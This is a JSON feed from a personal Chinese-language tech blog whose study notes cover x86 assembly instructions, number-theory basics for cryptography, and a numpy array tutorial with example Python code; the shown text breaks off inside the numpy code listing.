{
    "version": "https://jsonfeed.org/version/1",
    "title": "1asy",
    "subtitle": "Till I no longer can",
    "icon": "https://self-ferry.github.io/images/favicon.ico",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Self-ferry.github.io",
    "items": [
        {
            "id": "https://self-ferry.github.io/2021/03/24/%E6%B1%87%E7%BC%96%E5%A4%8D%E4%B9%A0/",
            "url": "https://self-ferry.github.io/2021/03/24/%E6%B1%87%E7%BC%96%E5%A4%8D%E4%B9%A0/",
            "title": "汇编复习",
            "date_published": "2021-03-24T12:19:17.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>之前学的，因为一些事情就耽搁了，转而学其他的了，现在有时间了，打算接着学，发现忘的差不多了。只能重学了。<br />\n逆水行舟，不进则退。</p>\n<h1 id=\"内存格式\"><a class=\"anchor\" href=\"#内存格式\">#</a> 内存格式</h1>\n<ol>\n<li>每个内存单元宽度为 8</li>\n<li>【0x 编号】称为内存地址</li>\n<li>内存是存储数据的，内存地址是对存储数据的一个标识，指向数据却不是数据，通过内存地址的指引，可以访问到内存当中指向的数据.</li>\n</ol>\n<p>内存最小的单位是一个字节 ==&gt;&gt; 8 个二进制数  ==&gt;&gt; 两位的十六进制数</p>\n<p>一个内存单元能存一个两位的十六进制数，而这就是内存数据</p>\n<h1 id=\"简单指令intel汇编语法\"><a class=\"anchor\" href=\"#简单指令intel汇编语法\">#</a> 简单指令 (intel 汇编语法)</h1>\n<h2 id=\"mov\"><a class=\"anchor\" href=\"#mov\">#</a> mov</h2>\n<p>格式：  <code>mov destination, source</code></p>\n<p><code>mov eax, ebx</code>   // 将 EBX 中的内容复制到 EAX 寄存器中<br />\n <code>mov eax, 0x42</code>  // 将立即数 0x42 复制到 EAX 寄存器中<br />\n <code>mov eax, [0x443212C4]</code>  // 将内存地址 0x443212C4 的四个字节复制到 EAX 寄存器<br />\n <code>mov eax, [ebx+esi*4]</code>   // 将 ebx+esi*4 等式结果只想的内存地址处 4 个字节复制至 EAX</p>\n<h2 id=\"lea\"><a class=\"anchor\" href=\"#lea\">#</a> lea</h2>\n<p>格式：  <code>lea destination, source</code></p>\n<p>lea 指令用来将一个内存地址赋给目的操作数。<br />\n例如，  <code>lea eax, [ebx+8]</code>  就是将 EBX+8 的值给 EAX。<br />\n相反的， <code>mov eax, [ebx+8]</code>  则加载内存中地址为 EBX+8 处的数据。</p>\n<h2 id=\"算术运算\"><a class=\"anchor\" href=\"#算术运算\">#</a> 算术运算</h2>\n<h3 id=\"加减运算\"><a class=\"anchor\" href=\"#加减运算\">#</a> 加减运算</h3>\n<p><span class=\"label\">例子</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">指令</td>\n<td style=\"text-align:left\">描述</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">sub eax,0x10</td>\n<td style=\"text-align:left\">EAX 寄存器值减去 0x10</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">add eax,ebx</td>\n<td style=\"text-align:left\">将 EBX 值加入 EAX 并将结果保存至 EAX</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">inc edx</td>\n<td style=\"text-align:left\">EDX 值递增 1</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">dec ecx</td>\n<td style=\"text-align:left\">ECX 值递减 1</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"乘除运算\"><a class=\"anchor\" href=\"#乘除运算\">#</a> 乘除运算</h3>\n<p>乘法和除法都使用了一个预先规定的寄存器。因此其运算就是指令码加上寄存器要去乘除的值。<br />\n <code>mul</code>  和 <code>div</code>  指令要操作的寄存器一般会在之前许多条指令的地方被赋值，因此你可能需要在程序的上下文中来寻找。<br />\n <code>mul value</code>  指令总是将 <code>eax</code>  乘上 <code>value</code> 。因此， <code>EAX</code>  寄存器必须在乘法指令出现前就赋值好。</p>\n<p>乘法的结果以 64 位的形式分开存储在两个寄存器中： <code>EDX</code>  和 <code>EAX</code> 。其中 EDX 存储了高的 32 位，EAX 存储低的 32 位。</p>\n<p>32 位模式下，MUL（无符号数乘法）指令有三种类型：</p>\n<pre><code>第一种执行 8 位操作数与 AL 寄存器的乘法；\n第二种执行 16 位操作数与 AX 寄存器的乘法；\n第三种执行 32 位操作数与 EAX 寄存器的乘法。\n</code></pre>\n<p>乘数和被乘数的大小必须保持一致，乘积的大小则是它们的一倍。这三种类型都可以使用寄存器和内存操作数，但不能使用立即数：</p>\n<pre><code>MUL reg/mem8\nMUL reg/meml6\nMUL reg/mem32\n</code></pre>\n<p>MUL 指令中的单操作数是乘数。下表按照乘数的大小，列出了默认的被乘数和乘积。由于目的操作数是被乘数和乘数大小的两倍，因此不会发生溢岀。</p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">被乘数</td>\n<td style=\"text-align:left\">乘数</td>\n<td style=\"text-align:left\">乘积</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">AL</td>\n<td style=\"text-align:left\">reg/mem8</td>\n<td style=\"text-align:left\">AX</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">AX</td>\n<td style=\"text-align:left\">reg/mem16</td>\n<td style=\"text-align:left\">DX:AX</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">EAX</td>\n<td style=\"text-align:left\">reg/mem32</td>\n<td style=\"text-align:left\">EDX:EAX</td>\n</tr>\n</tbody>\n</table>\n<p>如果乘积的高半部分不为零，则 MUL 会把进位标志位和溢出标志位置 1。因为进位标志位常常用于无符号数的算术运算，在此我们也主要说明这种情况。例如，当 AX 乘以一个 16 位操作数时，乘积存放在 DX 和 AX 寄存器对中。其中，乘积的高 16 位存放在 DX，低 16 位存放在 AX。如果 DX 不等于零，则进位标志位置 1，这就意味着隐含的目的操作数的低半部分容纳不了整个乘积。</p>\n<p>有个很好的理由要求在执行 MUL 后检查进位标志位，即，确认忽略乘积的高半部分是否安全。</p>\n<p>32 位模式下，DIV（无符号除法）指令执行 8 位、16 位和 32 位无符号数除法。其中，单寄存器或内存操作数是除数。格式如下：</p>\n<pre><code>DIV reg/mem8\nDIV reg/meml6\nDIV reg/mem32\n</code></pre>\n<p>下表给出了被除数、除数、商和余数之间的关系：</p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">被除数</td>\n<td style=\"text-align:left\">除数</td>\n<td style=\"text-align:left\">商</td>\n<td>余数</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">AX</td>\n<td style=\"text-align:left\">reg/mem8</td>\n<td style=\"text-align:left\">AL</td>\n<td>AH</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">DX:AX</td>\n<td style=\"text-align:left\">reg/mem16</td>\n<td style=\"text-align:left\">AX</td>\n<td>DX</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">EDX:EAX</td>\n<td style=\"text-align:left\">reg/mem32</td>\n<td style=\"text-align:left\">EAX</td>\n<td>EDX</td>\n</tr>\n</tbody>\n</table>\n<p>64 位模式下，DIV 指令用 RDX:RAX 作被除数，用 64 位寄存器和内存操作数作除数，商存放到 RAX，余数存放在 RDX 中。</p>\n<h2 id=\"逻辑运算符\"><a class=\"anchor\" href=\"#逻辑运算符\">#</a> 逻辑运算符</h2>\n<ol>\n<li>否操作指令 NOT</li>\n</ol>\n<p><code>NOT OPRD</code></p>\n<p>把 OPRD 取反，再回送给 OPRD</p>\n<p>对标志位没有影响</p>\n<ol start=\"2\">\n<li>与操作指令 AND [与]</li>\n</ol>\n<p><code>AND OPRD1，OPRD2</code></p>\n<p>OPRD1 和 OPRD2 执行与操作，结果送到 OPRD1</p>\n<p>执行后，CF＝OF＝0，标志 PF，ZF，SF 反映运算结果，AF 未定义</p>\n<p>某个操作数自身与，值不变，可使进位标志 CF＝0</p>\n<ol start=\"3\">\n<li>或操作指令 OR [或]</li>\n</ol>\n<p><code>OR OPRD1 OPRD2</code></p>\n<p>标志位同与运算指令</p>\n<p>某个操作数自身或，值不变，可使进位标志 CF＝0</p>\n<ol start=\"4\">\n<li>异或操作指令 XOR [异或]</li>\n</ol>\n<p><code>XOR OPRD1 OPRD2</code></p>\n<p>标志位同与运算指令</p>\n<p>某个操作数自身异或，值不变，可使进位标志 CF＝0</p>\n<p>与 0 异或，不变，与 1 异或，取反。</p>\n<ol start=\"5\">\n<li>测试指令 TEST</li>\n</ol>\n<p><code>TEST OPRD1 OPRD2</code></p>\n<p>指令与 AND 类似，但结果不回送</p>\n<p>指令执行后，ZF，PF，SF 反映运算结果，CF＝OF＝0</p>\n",
            "tags": [
                "汇编",
                "x86汇编指令"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/03/24/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80/",
            "url": "https://self-ferry.github.io/2021/03/24/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80/",
            "title": "密码学数论基础",
            "date_published": "2021-03-24T06:19:48.000Z",
            "content_html": "<h1 id=\"数论基础\"><a class=\"anchor\" href=\"#数论基础\">#</a> 数论基础</h1>\n<h2 id=\"整除性和带余除法\"><a class=\"anchor\" href=\"#整除性和带余除法\">#</a> 整除性和带余除法</h2>\n<h2 id=\"整除性\"><a class=\"anchor\" href=\"#整除性\">#</a> 整除性</h2>\n<p><span class=\"label\">定义：</span><br />\na、b 是两个整数，b≠0 ，如果存在一个整数 m 使等式 a=m*b 成立，则称 b 整除 a，记为 b|a,a 是被除数，b 是除数。</p>\n<p>a/b 记为 b|a a 除以 b 记为 b 整除 a</p>\n<p><span class=\"label\">性质：</span></p>\n<ul>\n<li>若 a|1， 则 a=±1。</li>\n<li>若 a|b 且 b|a，则 a=±b。</li>\n<li>任何不等于零的数整除 0。</li>\n<li>若 a|b 且 b|c，则 a|c。<br />\n <code>11|66 且 66|198 =&gt; 11|198</code></li>\n<li>对任意整数 m，n，若 b|g 且 b|h，则可得出 b|（mg+nh）。</li>\n</ul>\n<p>之所以得出最后一条结论，是因为：</p>\n<ul>\n<li>若 b|g，存在 g1，使得 g 可以表示为 g=b*g1</li>\n<li>若 b|h, 则存在 h1，使得还可以表示为 h=b*h1</li>\n</ul>\n<p>所以：<br />\n <code>mg + nh = mbg1 + nbh1 = b * (mg1 + nh1)</code> <br />\n 得出 b 整除 mg+nh。</p>\n<p><span class=\"label\">例题</span><br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<h3 id=\"带余除法\"><a class=\"anchor\" href=\"#带余除法\">#</a> 带余除法</h3>\n<p>对给定的任意一个正整数 n 和任意非负整数 a, 若用 n 除 a, 得到整数商 q 和整数余数 r, 则满足以下关系式:<br />\n <code>a = qn + r, 0 ≤ r &lt; n; q = |(a|b)|</code></p>\n<h2 id=\"欧几里得算法\"><a class=\"anchor\" href=\"#欧几里得算法\">#</a> 欧几里得算法</h2>\n<h3 id=\"最大公约数\"><a class=\"anchor\" href=\"#最大公约数\">#</a> 最大公约数</h3>\n<p>最大公约数，也称最大公因数、最大公因子，指两个或多个整数共有约数中最大的一个。</p>\n<p>对于整数 a,b,m, 若满足 a=mb, 则称非零整数 b 是 a 的一个因子。我们用 gcd (a,b) 来表示 a 的最大公因子。a 和 b 的最大公因子是能同时整除 a 和 b 的最大整数。另外，定义 gcd (0,0)=0。<br />\n更正式的描述是，正整数 c 称为 a 和 b 的最大公因子，如果<br />\n (1) c 是 a 和 b 的因子。<br />\n(2) a、b 的因子都是 c 的一个因子。</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n",
            "tags": [
                "密码编码学与网络安全",
                "数论基础"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/03/23/%E6%95%B0%E7%BB%84%E4%B8%8E%E7%9F%A9%E9%98%B5/",
            "url": "https://self-ferry.github.io/2021/03/23/%E6%95%B0%E7%BB%84%E4%B8%8E%E7%9F%A9%E9%98%B5/",
            "title": "数组与矩阵",
            "date_published": "2021-03-23T11:09:25.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=\"]}]'></div></div>\n<h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n",
            "tags": []
        },
        {
            "id": "https://self-ferry.github.io/2021/03/23/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "url": "https://self-ferry.github.io/2021/03/23/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "title": "pandas库学习",
            "date_published": "2021-03-23T11:08:13.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=\"]}]'></div></div>\n<h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n",
            "tags": []
        },
        {
            "id": "https://self-ferry.github.io/2021/03/23/numpy%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "url": "https://self-ferry.github.io/2021/03/23/numpy%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "title": "numpy库学习",
            "date_published": "2021-03-23T11:07:40.000Z",
            "content_html": "<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9udW1weS9udW1weS10dXRvcmlhbC5odG1s\">https://www.runoob.com/numpy/numpy-tutorial.html</span></p>\n<h1 id=\"numpy库简介\"><a class=\"anchor\" href=\"#numpy库简介\">#</a> Numpy 库简介</h1>\n<p>NumPy (Numerical Python) 是 Python 语言的一个扩展程序库，支持大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。</p>\n<p>NumPy 的前身 Numeric 最早是由 Jim Hugunin 与其它协作者共同开发，2005 年，Travis Oliphant 在 Numeric 中结合了另一个同性质的程序库 Numarray 的特色，并加入了其它扩展而开发了 NumPy。NumPy 为开放源代码并且由许多协作者共同维护开发。</p>\n<p>NumPy 是一个运行速度非常快的数学库，主要用于数组计算，包含：</p>\n<ul>\n<li>一个强大的 N 维数组对象 ndarray</li>\n<li>广播功能函数</li>\n<li>整合 C/C++/Fortran 代码的工具</li>\n<li>线性代数、傅里叶变换、随机数生成等功能</li>\n</ul>\n<h1 id=\"numpy-应用\"><a class=\"anchor\" href=\"#numpy-应用\">#</a> NumPy 应用</h1>\n<p>NumPy 通常与 SciPy（Scientific Python）和 Matplotlib（绘图库）一起使用， 这种组合广泛用于替代 MatLab，是一个强大的科学计算环境，有助于我们通过 Python 学习数据科学或者机器学习。</p>\n<p>SciPy 是一个开源的 Python 算法库和数学工具包。</p>\n<p>SciPy 包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。</p>\n<p>Matplotlib 是 Python 编程语言及其数值数学扩展包 NumPy 的可视化操作界面。它为利用通用的图形用户界面工具包，如 Tkinter, wxPython, Qt 或 GTK+ 向应用程序嵌入式绘图提供了应用程序接口（API）。</p>\n<h1 id=\"相关链接\"><a class=\"anchor\" href=\"#相关链接\">#</a> 相关链接</h1>\n<p>NumPy 官网 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5udW1weS5vcmcv\">http://www.numpy.org/</span><br />\nNumPy 源代码：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL251bXB5L251bXB5\">https://github.com/numpy/numpy</span></p>\n<h1 id=\"numpy-ndarray对象\"><a class=\"anchor\" href=\"#numpy-ndarray对象\">#</a> Numpy Ndarray 对象</h1>\n<p>NumPy 最重要的一个特点是其 N 维数组对象 ndarray，它是一系列同类型数据的集合，以 0 下标为开始进行集合中元素的索引。</p>\n<p>ndarray 对象是用于存放同类型元素的多维数组。</p>\n<p>ndarray 中的每个元素在内存中都有相同存储大小的区域。</p>\n<p>ndarray 内部由以下内容组成：</p>\n<ul>\n<li>\n<p>一个指向数据（内存或内存映射文件中的一块数据）的指针。</p>\n</li>\n<li>\n<p>数据类型或 dtype，描述在数组中的固定大小值的格子。</p>\n</li>\n<li>\n<p>一个表示数组形状（shape）的元组，表示各维度大小的元组。</p>\n</li>\n<li>\n<p>一个跨度元组（stride），其中的整数指的是为了前进到当前维度下一个元素需要 &quot;跨过&quot; 的字节数。</p>\n</li>\n</ul>\n<h1 id=\"创建ndarray\"><a class=\"anchor\" href=\"#创建ndarray\">#</a> 创建 Ndarray</h1>\n<p>创建一个 ndarray 只需调用 NumPy 的 array 函数即可：<br />\n <code>numpy.array(object, dtype = None, copy = True, order = None, subok = False, ndmin = 0)</code></p>\n<p>参数说明：</p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:right\">名称</td>\n<td style=\"text-align:left\">描述</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">object</td>\n<td style=\"text-align:left\">数组或嵌套的数列</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">dtype</td>\n<td style=\"text-align:left\">数组元素的数据类型，可选</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">copy</td>\n<td style=\"text-align:left\">对象是否需要复制，可选</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">order</td>\n<td style=\"text-align:left\">创建数组的样式，C 为行方向，F 为列方向，A 为任意方向（默认）</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">subok</td>\n<td style=\"text-align:left\">默认返回一个与基类类型一致的数组</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">ndmin</td>\n<td style=\"text-align:left\">指定生成数组的最小维度</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"认识numpy的数组对象ndarray\"><a class=\"anchor\" href=\"#认识numpy的数组对象ndarray\">#</a> 认识 Numpy 的数组对象 Ndarray</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 代码 2-1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np  <span class=\"token comment\"># 导入 NumPy 库</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>arr1 <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建一维数组</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">' 创建的数组为： '</span><span class=\"token punctuation\">,</span> arr1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 创建二维数组</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>arr2 <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的数组为：\\n'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组类型为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">.</span>dtype<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组类型</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组元素个数为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组元素个数</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组每个元素大小为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">.</span>itemsize<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组每个元素大小</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 代码 2-2</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>arr2<span class=\"token punctuation\">.</span>shape <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span>  <span class=\"token comment\"># 重新设置 shape</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'重新设置shape 后的arr2 为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># 代码 2-3</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用arange函数创建的数组为：\\n'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># 代码 2-4</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用linspace函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>linspace<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 代码 2-5</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用logspace函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>logspace<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># 代码 2-6</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用zeros函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>zeros<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># 代码 2-7</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用eye函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>eye<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># 代码 2-8</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用diag函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>diag<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># 代码 2-9</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用ones函数的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>ones<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\"># 代码 2-10</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>float64<span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 整型转换为浮点型</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>int8<span class=\"token punctuation\">(</span><span class=\"token number\">42.0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 浮点型转换为整型</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 整型转换为布尔型</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 整型转换为布尔型</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 布尔型转换为浮点型</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 布尔型转换为浮点型</span></pre></td></tr><tr><td 